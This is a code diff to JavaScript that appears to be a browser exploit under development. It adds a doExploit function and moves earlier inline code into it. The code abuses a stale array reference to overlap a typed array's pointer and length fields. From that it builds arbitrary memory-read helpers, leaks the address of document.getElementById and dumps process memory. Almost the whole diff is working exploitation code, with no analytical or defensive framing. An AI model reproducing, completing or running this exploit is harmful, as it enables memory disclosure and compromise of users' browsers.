@@ -51,6 +51,76 @@ function allocBuffers() {
 	}
 }
 
+function doExploit(buf, stale, temp) {
+	function dump(name, buf, count) {
+		for(var j = 0; j < count; ++j)
+			log(name + '[' + j + '] == 0x' + buf[j].toString(16));
+	}
+	function dumpbuf(count) {
+		dump('Buf', buf, count);
+	}
+	function dumptemp(count) {
+		dump('Tem', temp, count);
+	}
+
+	function setStale(obj) {
+		eval('(function(obj) { stale[eval("1 || ' + Math.random() + '")] = obj; log(stale[1].toString()[0]); })')(obj);
+	}
+
+	function setPtr(lo, hi, len) {
+		setStale(temp);
+		buf[4] = lo;
+		buf[5] = hi;
+		buf[6] = len;
+	}
+
+	function read4(lo, hi) {
+		setPtr(lo, hi, 1);
+		return stale[1][0];
+	}
+
+	function readAddr(obj) {
+		setStale(obj);
+		log('Obj memory:');
+		dumpbuf(16);
+		var addr = [buf[14], buf[15]];
+		setStale(temp);
+		log('Prev 0x' + addr[0].toString(16));
+		log('Now 0x' + buf[4].toString(16));
+
+		return addr;
+	}
+
+	/*log('Temp memory:')
+	dumpbuf(16);
+	var addr = readAddr(tu);
+	log('Temp memory:')
+	dumpbuf(16);
+	log(read4(addr[0], addr[1]).toString(16));*/
+
+	stale[1] = document.getElementById;
+	dumpbuf(12);
+	var lo = buf[6];
+	var hi = buf[7];
+	stale[1] = temp;
+	buf[4] = lo;
+	buf[5] = hi;
+	buf[6] = 128;
+	log('????????');
+
+	lo = temp[6];
+	hi = temp[7];
+	buf[4] = lo;
+	buf[5] = hi;
+	dumptemp(16);
+	log('!!!!!!!!!!!!');
+	lo = temp[4];
+	hi = temp[5];
+	buf[4] = lo;
+	buf[5] = hi;
+	dumptemp(128);
+}
+
 function doItAll() {
 	log('Starting');
 
@@ -116,50 +186,9 @@ function doItAll() {
 
 	log('Looking for buf...');
 
-	function dumpbuf(count) {
-		for(var j = 0; j < count; ++j)
-			log('Buf[' + j + '] == 0x' + bufs[i][j].toString(16));
-	}
-
 	for(var i = 0; i < bufs.length; ++i) {
 		if(bufs[i][0] != 0x41424344) {
-			function setStale(obj) {
-				stale[1] = obj;
-			}
-
-			function setPtr(lo, hi, len) {
-				setStale(temp);
-				bufs[i][4] = lo;
-				bufs[i][5] = hi;
-				bufs[i][6] = len;
-			}
-
-			function read4(lo, hi) {
-				setPtr(lo, hi, 1);
-				return temp[0];
-			}
-
-			function readAddr(obj) {
-				setStale(obj);
-				log('Obj memory:');
-				dumpbuf(16);
-				var addr = [bufs[i][4], bufs[i][5]];
-				setStale(temp);
-				log('Prev 0x' + addr[0].toString(16));
-				log('Now 0x' + bufs[i][4].toString(16));
-
-				return addr;
-			}
-
-			log('temp memory:');
-			dumpbuf(16);
-			var addr = readAddr(tu);
-			//log(read4(addr[0], addr[1]).toString(16));
-			bufs[i][6] = 27;
-			log('temp memory:');
-			dumpbuf(16);
-			log(temp.length);
-			log(tu.length);
+			doExploit(bufs[i], stale, temp);
 			break;
 		}
 	}
